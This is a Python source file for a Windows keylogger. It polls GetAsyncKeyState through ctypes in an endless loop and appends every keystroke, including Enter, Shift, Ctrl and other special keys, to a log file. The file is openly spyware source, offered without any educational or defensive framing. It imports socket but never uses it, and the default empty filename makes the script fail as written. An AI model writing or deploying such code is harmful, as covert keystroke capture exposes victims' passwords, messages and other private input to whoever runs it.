import os
import sys
import time
from ctypes import * # To import windows OS c function
import socket
GetAsyncKeyState = cdll.user32.GetAsyncKeyState # Import C function from windows to get pressed key

class KeyLogger:

        def __init__(self, filename=""):
                self.filename = filename
                self.specialKeys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}

        def resetKeyStates(self):
                for i in range(0, 256):
                    GetAsyncKeyState(i)

        def writeKey(self, k):
                with open(self.filename, 'a') as logFile:
                        logFile.write(k)
                        logFile.close()

        def startLogging(self):
                while True:
                        for i in range(0, 256):
                                if GetAsyncKeyState(i) & 1:
                                        if i in self.specialKeys:
                                                if i == 0x0d:
                                                        self.writeKey("\n")
                                                elif i == 0x20:
                                                        self.writeKey(" ")
                                                else:
                                                        specialKey = "<{}>".format(self.specialKeys[i])
                                                        self.writeKey(specialKey)
                                        elif 0x30 <= i <= 0x5a and i:
                                               self.writeKey("%c" % i)
                                        else:
                                                self.writeKey("[%02x]" % i)

if __name__ == "__main__":
    kl = KeyLogger()
    kl.resetKeyStates()
    kl.startLogging()